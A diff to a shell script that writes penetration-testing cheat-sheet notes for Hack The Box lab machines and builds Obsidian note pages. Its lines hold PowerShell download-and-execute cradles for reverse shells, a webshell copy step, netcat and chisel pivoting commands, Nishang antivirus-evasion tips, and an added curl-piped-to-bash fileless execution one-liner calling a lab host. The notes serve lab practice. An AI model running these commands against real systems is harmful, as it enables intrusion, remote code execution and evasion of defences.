@@ -62,23 +62,26 @@ echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/
 echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log' >> $HOME/notes
 echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log' >> $HOME/notes
 echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
+# Windows shells
 echo '#echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0' >> $HOME/notes
 echo '#powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')"' >> $HOME/notes
 echo '#IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
 echo '#cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
+# Try nikto
 echo "#nikto -h $IP"
 echo "add machine name domain.htb to /etc/hosts (search to ensure named correct)"
 echo "#nikto -h domain.htb"
+# To fix copy and paste problems in Virtual box
 echo "any problems kill VBoxClient clipboard etc."
 
-# cool way to pivot/scan 
+# Cool way to pivot/scan 
 echo "really cool way to pivot/scan with nc" >> $HOME/notes
 echo "mkfifo reply" >> $HOME/notes
 echo "nc -klvnp 65535 < reply | nc 127.0.0.1 6739 > reply" >> $HOME/notes
 echo "(nc -klvnp <port to use> < reply | nc 127.0.0.1 <port interested in scanning etc> > reply)" >> $HOME/notes
 echo "(dont forget to rm reply)" >> $HOME/notes
 echo "Then can just scan port 6379 through 65535 etc." >> $HOME/notes
-# more ways to pivot
+# More ways to pivot
 echo "# 9510 and other ports through chisel" >> $HOME/notes
 echo "# On Kali" >> $HOME/notes
 echo "kali@kali:~$ ./chisel server -p 9002 --reverse  " >> $HOME/notes
@@ -86,11 +89,20 @@ echo "# On Windows" >> $HOME/notes
 echo "./chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512" >> $HOME/notes
 echo "# if using metasploit" >> $HOME/notes
 echo "portfwd add -l 9510 -p 9510 -r 10.10.11.115" >> $HOME/notes
+# Windows Sharp Binaries
+echo "# Windows Sharp Binaries" >> $HOME/notes
 echo "check this out - git clone https://github.com/Flangvik/SharpCollection.git for windows sharp binaries" >> $HOME/notes
+# Run Obsidian in background
+echo "# Run Obsidian" >> $HOME/notes
 echo "/opt/obsidian/Obsidian-0.11.5.AppImage &>/dev/null &" >> $HOME/notes
+# AntiVirus Evasion
+echo "# Anti Virus Evasion" >> $HOME/notes
 echo "for nishang antivirus evasion, just replace the Invoke-PowershellTcp with anything" >> $HOME/notes
 echo "and replace sendback with anything, and it should replace sendback and sendback2" >> $HOME/notes
 echo "and for the oneliner, split it to individual lines after every semicolon (;) , or just at after the {0};" >> $HOME/notes 
+# Fileless elf execution
+echo "# Fileless elf execution" >> $HOME/notes
+echo "curl http://10.10.14.178/ls.b64 |bash <(curl http://10.10.14.178/ddexec.sh) /bin/test -al" >> $HOME/notes
 
 # Build obsidian files for not keeping
 # Cover page
@@ -114,6 +126,7 @@ echo '| Port | Service | Description |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
 echo '| --- | --- | --- |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
 echo '| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
 echo '| 80 | http | |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
+echo '| | | |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
 echo ' '
 echo 'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel' >> $HOME/$BOXNAME/05\ -\ Nmap.md
 # Web enumeration page
